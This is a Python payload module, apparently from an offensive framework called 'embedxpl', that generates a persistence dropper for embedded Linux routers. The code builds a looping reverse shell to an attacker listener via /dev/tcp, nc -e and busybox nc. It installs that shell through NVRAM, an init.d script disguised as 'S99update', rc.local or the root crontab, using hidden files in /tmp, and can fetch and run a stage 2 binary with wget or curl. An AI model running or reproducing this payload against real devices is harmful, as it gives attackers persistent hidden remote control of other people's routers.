"""Firmware Dropper Payload.

Payload de persistência para dispositivos Linux embedded (OpenWRT, LEDE, DD-WRT).
Injeta stage 2 em NVRAM ou partição jffs2/overlay para sobreviver a reboot.

Métodos de persistência:
  1. NVRAM (nvram set/commit) — roteadores Broadcom/Netgear/Linksys
  2. /etc/init.d/S99embedxpl — SysV init em OpenWRT
  3. /etc/rc.local — sistemas mais simples
  4. cron (root crontab) — fallback universal
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Firmware Dropper",
        "description": "Embedded Linux persistence dropper — survives reboot via NVRAM/init.d/cron.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Reverse shell listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Reverse shell listener port", "required": True, "default": "4444", "value": "4444"},
        "METHOD": {
            "description": "Persistence method: nvram|initd|rc_local|cron",
            "required": False,
            "default": "cron",
            "value": "cron",
        },
        "DOWNLOAD_URL": {
            "description": "URL to download stage 2 binary (leave empty to use embedded shell)",
            "required": False,
            "default": "",
            "value": "",
        },
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        method = self.options["METHOD"]["value"]
        dl_url = self.options["DOWNLOAD_URL"]["value"]

        # Stage 2: minimal busybox ash reverse shell
        stage2 = (
            f"#!/bin/sh\n"
            f"while true; do\n"
            f"  /bin/ash -i >& /dev/tcp/{lhost}/{lport} 0>&1 || "
            f"  nc {lhost} {lport} -e /bin/ash || "
            f"  busybox nc {lhost} {lport} -e /bin/ash\n"
            f"  sleep 30\n"
            f"done\n"
        )

        if method == "nvram":
            script = (
                f"echo '{stage2}' > /tmp/.sys\n"
                f"chmod +x /tmp/.sys\n"
                f"/tmp/.sys &\n"
                f"nvram set rc_startup='/tmp/.sys &'\n"
                f"nvram commit\n"
            )
        elif method == "initd":
            script = (
                f"cat > /etc/init.d/S99update << 'EOF'\n"
                f"#!/bin/sh\n"
                f"{stage2}"
                f"EOF\n"
                f"chmod +x /etc/init.d/S99update\n"
                f"/etc/init.d/S99update &\n"
            )
        elif method == "rc_local":
            script = (
                f"echo '{stage2.strip()}' >> /etc/rc.local\n"
                f"sh /etc/rc.local &\n"
            )
        else:  # cron
            script = (
                f"echo '{stage2}' > /tmp/.upd\n"
                f"chmod +x /tmp/.upd\n"
                f"(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.upd') | crontab -\n"
                f"/tmp/.upd &\n"
            )

        if dl_url:
            script = (
                f"wget -q -O /tmp/.sys '{dl_url}' || "
                f"curl -fsSL '{dl_url}' -o /tmp/.sys\n"
                f"chmod +x /tmp/.sys\n"
            ) + script

        return script.encode()
